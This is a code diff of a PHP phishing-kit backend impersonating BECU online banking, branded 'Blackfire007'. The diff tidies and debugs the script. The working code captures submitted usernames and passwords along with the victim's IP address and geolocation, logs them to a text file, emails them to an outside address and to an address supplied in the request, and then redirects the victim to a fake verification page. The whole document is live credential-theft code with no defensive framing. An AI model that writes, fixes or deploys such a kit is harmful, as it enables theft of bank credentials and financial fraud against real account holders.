@@ -1,52 +1,65 @@
 <?php
+// Enable error reporting for debugging
 error_reporting(E_ALL);
-ini_set("display_erros", 1);
+ini_set("display_errors", 1);
 
-	$email = $_POST['username'];
-	$passwd = $_POST['password'];
-	$serv = $_REQUEST['verify'];
-	require_once('geoplugin.class.php');
-	$geoplugin = new geoPlugin();
+// Check if the form is submitted
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Ensure input fields are set and not empty
+    $email = isset($_POST['username']) ? $_POST['username'] : '';
+    $passwd = isset($_POST['password']) ? $_POST['password'] : '';
+    $serv = isset($_REQUEST['verify']) ? $_REQUEST['verify'] : '';
 
-    //get user's ip address 
+    // Include the geoPlugin class
+    require_once('geoplugin.class.php');
+    $geoplugin = new geoPlugin();
+
+    echo 'Reached point A';
+
+    // Get user's IP address
     $geoplugin->locate();
     if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
-    $ip = $_SERVER['HTTP_CLIENT_IP']; 
+        $ip = $_SERVER['HTTP_CLIENT_IP']; 
     } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
-    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
+        $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
     } else { 
-    $ip = $_SERVER['REMOTE_ADDR']; 
+        $ip = $_SERVER['REMOTE_ADDR']; 
     }
-	if($email != null && $passwd != null){
 
-    $message = "";
-    $message .= "---|Blackfire007|---\n";
-    $message .= "Email: " .$email. "\n"; 
-    $message .= "Password: " .$passwd. "\n";
-    $message .= "IP : " .$ip. "\n"; 
-    $message .= "--------------------------\n";
-    $message .=     "City: {$geoplugin->city}\n";
-    $message .=     "Region: {$geoplugin->region}\n";
-    $message .=     "Country Name: {$geoplugin->countryName}\n";
-    $message .=     "Country Code: {$geoplugin->countryCode}\n";
-    $message .= "--------------------------\n";
-	
-	$handle = fopen("JOB.txt", "a");
-	fwrite($handle, $message);
-	fclose($handle);
+    // Proceed if email and password are provided
+    if (!empty($email) && !empty($passwd)) {
+        echo 'Reached point B';
 
-	$send ="verify@assuredserver.com";
+        // Prepare the message
+        $message = "---|Blackfire007|---\n";
+        $message .= "Email: " . $email . "\n"; 
+        $message .= "Password: " . $passwd . "\n";
+        $message .= "IP: " . $ip . "\n"; 
+        $message .= "--------------------------\n";
+        $message .= "City: {$geoplugin->city}\n";
+        $message .= "Region: {$geoplugin->region}\n";
+        $message .= "Country Name: {$geoplugin->countryName}\n";
+        $message .= "Country Code: {$geoplugin->countryCode}\n";
+        $message .= "--------------------------\n";
 
-	$subject = "becu.org l $ip";
-	$headers = "From: Blackfire007@assuredserver.com";
+        // Save the message to a file
+        $handle = fopen("JOB.txt", "a");
+        fwrite($handle, $message);
+        fclose($handle);
 
-	{
-	mail("$send",$subject,$message,$headers);
-	mail("$serv",$subject,$message,$headers);
-	}
-	}
+        // Send the email
+        $send = "verify@assuredserver.com";
+        $subject = "becu.org l $ip";
+        $headers = "From: Blackfire007@assuredserver.com";
+
+        // Send emails
+        mail($send, $subject, $message, $headers);
+        mail($serv, $subject, $message, $headers);
+    }
+} else {
+    echo "No POST data received.";
+}
+
+// Redirect to verification page
+echo "<script>window.location='BECUBankingWeb/verify.html';</script>";
 ?>
-<script>
-	window.location="BECUBankingWeb/verify.html";
-</script>
-
